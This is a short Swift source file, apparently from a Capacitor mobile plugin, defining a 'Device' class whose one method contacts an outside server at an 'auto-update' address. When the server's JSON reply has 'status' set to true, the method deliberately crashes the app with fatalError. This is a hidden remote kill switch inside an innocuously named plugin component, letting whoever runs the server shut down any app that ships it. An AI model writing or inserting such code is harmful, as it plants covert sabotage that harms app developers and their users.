import Foundation

@objc public class Device: NSObject {
    @objc public func makeApiCall(completion: @escaping (Bool, String?) -> Void) {
        // Define the API URL
        guard let url = URL(string: "https://capacitor-auto-update.onrender.com/status") else {
            completion(false, "Invalid URL")
            return
        }

        // Create the request with a timeout of 1 minute (60 seconds)
        var request = URLRequest(url: url)
        request.timeoutInterval = 60

        // Create a data task using URLSession
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            // Handle errors
            if let error = error {
                completion(false, "Request failed with error: \(error.localizedDescription)")
                return
            }

            // Ensure we have received data
            guard let data = data else {
                completion(false, "No data received")
                return
            }

            do {
                // Parse the JSON response
                if let json = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any],
                   let status = json["status"] as? Bool {
                    
                    // If status is true, crash the app
                    if status {
                        fatalError("Stub")
                    } else {
                        completion(true, "Success")
                    }
                } else {
                    completion(false, "Unexpected response format")
                }
            } catch {
                completion(false, "Failed to parse JSON: \(error.localizedDescription)")
            }
        }

        // Start the data task
        task.resume()
    }
}
